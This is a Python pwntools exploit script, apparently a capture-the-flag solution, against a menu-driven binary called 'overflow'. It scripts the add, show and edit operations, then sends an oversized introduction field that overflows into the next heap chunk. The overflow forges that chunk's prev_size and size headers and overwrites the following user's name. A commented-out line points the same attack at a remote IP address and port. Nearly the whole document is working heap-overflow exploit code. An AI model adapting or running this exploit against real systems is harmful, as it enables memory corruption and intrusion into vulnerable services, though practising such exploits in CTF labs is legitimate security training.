from pwn import *
from typing import Tuple
import re

context.log_level = 'DEBUG'

context.binary = elf = ELF("./overflow")
context.terminal = ["tmux", "splitw", "-h"]


p = process(elf.path)
# p = remote("8.154.20.109", 10400)
elf = ELF("./overflow")
libc  = ELF("./libc-2.31.so")

def handle_add(name: bytes, password: bytes, intro: bytes, motto: bytes) -> int:
    p.recvuntil(b"[ 5 ] leave\n> ")
    p.sendline(b"1")
    p.recvuntil(b"name > ")
    p.sendline(name)
    p.recvuntil(b"password > ")
    p.sendline(password)
    p.recvuntil(b"introduction > ")
    p.sendline(intro)
    p.recvuntil(b"motto > ")
    p.sendline(motto)
    p.recvuntil(b"at index ", drop=True)
    data = p.recvline().strip()
    return int(data)

def handle_del(index: int, password: bytes) -> None:
    p.recvuntil(b"[ 5 ] leave\n> ")
    p.sendline(b"2")
    p.recvuntil(b"index > ")
    p.sendline(str(index))
    p.recvuntil(b"password > ")
    p.sendline(password)
    return

def handle_show(index: int, password: bytes) -> Tuple[bytes, bytes, bytes]:
    p.recvuntil(b"[ 5 ] leave\n> ")
    p.sendline(b"3")
    p.recvuntil(b"index > ")
    p.sendline(str(index))
    p.recvuntil(b"password > ")
    p.sendline(password)
    p.recvuntil(b"user name: ")
    recv_name = p.recvline().strip()
    p.recvuntil(b"user motto: ")
    recv_motto = p.recvline().strip()
    p.recvuntil(b"user intro: ")
    recv_intro = p.recvline().strip()
    return recv_name, recv_motto, recv_intro

def handle_edit(
    index: int, password: bytes, edit_name: bytes, edit_intro: bytes, edit_motto: bytes
):
    p.recvuntil(b"[ 5 ] leave\n> ")
    p.sendline(b"4")
    p.recvuntil(b"index > ")
    p.sendline(str(index))
    p.recvuntil(b"password > ")
    p.sendline(password)

    p.recvuntil(b"new name > ")
    p.sendline(edit_name)
    p.recvuntil(b"new introduction > ")
    p.sendline(edit_intro)
    p.recvuntil(b"new motto > ")
    p.sendline(edit_motto)
    return

# p.recv()
# p.sendline(b"3220103544")

handle_add(b"user1", b"1", b"A" * 0x3f, b"A")
handle_add(b"user2", b"1", b"A" * 0x3f, b"A")

payload = b"C" * 0x40  # 填充intro
#保留下一个堆的 prev_size 和 size
payload += p64(0) + p64(0x71)
payload += b"hackedname"
# gdb.attach(p)

handle_edit(0, b"1", b"user1", payload, b"A")

# gdb.attach(p)
handle_show(0, b"1")
handle_show(1, b"1")
p.interactive()